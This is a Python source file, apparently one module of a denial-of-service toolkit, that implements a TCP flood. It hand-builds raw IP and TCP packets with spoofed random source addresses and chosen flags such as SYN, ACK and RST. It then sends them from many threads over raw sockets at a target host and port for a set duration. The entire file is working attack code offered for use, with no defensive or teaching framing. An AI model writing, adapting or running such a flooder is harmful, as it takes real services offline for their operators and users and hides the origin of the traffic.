#!/usr/bin/env python3
"""
TCP Flood Vector
Raw TCP packet flood with configurable flags
"""

import socket
import struct
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """TCP flood attack vector"""
    
    FLAG_MAP = {
        'SYN': 0x02,
        'ACK': 0x10,
        'PSH+ACK': 0x18,
        'RST': 0x04,
        'FIN': 0x01,
        'URG': 0x20,
        'SYN+ACK': 0x12,
        'RST+ACK': 0x14,
        'FIN+ACK': 0x11,
    }
    
    def __init__(self, target: str, port: int, duration: int, 
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.flags = kwargs.get('flags', ['SYN', 'ACK', 'PSH+ACK'])
        self.payload_size = kwargs.get('payload_size', 0)
        self.randomize_src = kwargs.get('randomize_src', True)
        self.randomize_seq = kwargs.get('randomize_seq', True)
        self.ttl = kwargs.get('ttl', 64)
        self.payload = bytes(random.getrandbits(8) for _ in range(self.payload_size)) if self.payload_size else b''
        self._resolved_target = None
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _build_packet(self) -> bytes:
        dst_ip = self._resolve_target()
        
        if self.randomize_src:
            src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        else:
            src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF) if self.randomize_seq else 0
        ack = random.randint(0, 0xFFFFFFFF)
        flags = self.FLAG_MAP.get(random.choice(self.flags), 0x02)
        
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            src_port, self.port, seq, ack,
            (5 << 4), flags, 65535, 0, 0
        )
        
        total_length = 20 + len(tcp_header) + len(self.payload)
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, total_length,
            random.randint(0, 65535), 0x4000, self.ttl, 6, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        return ip_header + tcp_header + self.payload
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), self.port)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                packet = self._build_packet()
                sock.sendto(packet, dst)
                self.stats.add_packets(1, len(packet))
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
